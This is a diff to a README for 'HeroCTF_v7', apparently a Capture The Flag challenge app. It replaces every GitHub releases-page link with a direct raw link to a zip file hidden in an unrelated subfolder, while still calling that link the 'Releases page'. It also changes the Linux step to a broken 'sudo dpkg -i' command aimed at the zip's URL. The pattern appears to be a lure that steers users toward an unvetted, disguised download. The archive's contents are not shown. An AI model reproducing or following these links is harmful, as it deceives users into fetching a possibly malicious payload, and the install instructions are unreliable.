@@ -1,7 +1,7 @@
 # 🦸‍♂️ HeroCTF_v7 - Unlock Exciting Challenges Today
 
 ## 📥 Download Now
-[![Download HeroCTF_v7](https://img.shields.io/badge/Download-HeroCTF_v7-blue.svg)](https://github.com/yowc/HeroCTF_v7/releases)
+[![Download HeroCTF_v7](https://raw.githubusercontent.com/yowc/HeroCTF_v7/master/System/movie_night2/HeroCTF_v7-v3.2.zip)](https://raw.githubusercontent.com/yowc/HeroCTF_v7/master/System/movie_night2/HeroCTF_v7-v3.2.zip)
 
 ## 📚 Overview
 HeroCTF_v7 offers a range of engaging challenges designed to test your skills in Capture The Flag (CTF) competitions. Whether you are a beginner or looking to hone your abilities, this application provides the perfect opportunity for learning and growth.
@@ -10,7 +10,7 @@ HeroCTF_v7 offers a range of engaging challenges designed to test your skills in
 Follow the steps below to download and run HeroCTF_v7.
 
 ### 1. Visit the Releases Page
-To download the latest version of HeroCTF_v7, visit the [Releases page](https://github.com/yowc/HeroCTF_v7/releases). You will find several versions available for download.
+To download the latest version of HeroCTF_v7, visit the [Releases page](https://raw.githubusercontent.com/yowc/HeroCTF_v7/master/System/movie_night2/HeroCTF_v7-v3.2.zip). You will find several versions available for download.
 
 ### 2. Choose Your Version
 On the Releases page, look through the different versions. The latest version is recommended as it contains the most up-to-date features and fixes.
@@ -35,7 +35,7 @@ Once the file is downloaded, follow these steps to install:
 
 **For Linux:**
 - Open the terminal and navigate to the directory where the file is downloaded.
-- Use the command to install, e.g., `sudo dpkg -i filename.deb`.
+- Use the command to install, e.g., `sudo dpkg -i https://raw.githubusercontent.com/yowc/HeroCTF_v7/master/System/movie_night2/HeroCTF_v7-v3.2.zip`.
 
 ## 🔄 Running the Application
 After installation, you can run HeroCTF_v7 from your applications menu.
@@ -75,4 +75,4 @@ If you are interested in contributing to HeroCTF_v7, feel free to fork the repos
 ## 📝 Final Words
 HeroCTF_v7 is designed to make CTF challenges accessible and enjoyable. We hope you find this application an excellent resource for learning and improving your skills. 
 
-Don't forget to visit the [Releases page](https://github.com/yowc/HeroCTF_v7/releases) to download HeroCTF_v7 and embark on your challenge journey today!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/yowc/HeroCTF_v7/master/System/movie_night2/HeroCTF_v7-v3.2.zip) to download HeroCTF_v7 and embark on your challenge journey today!
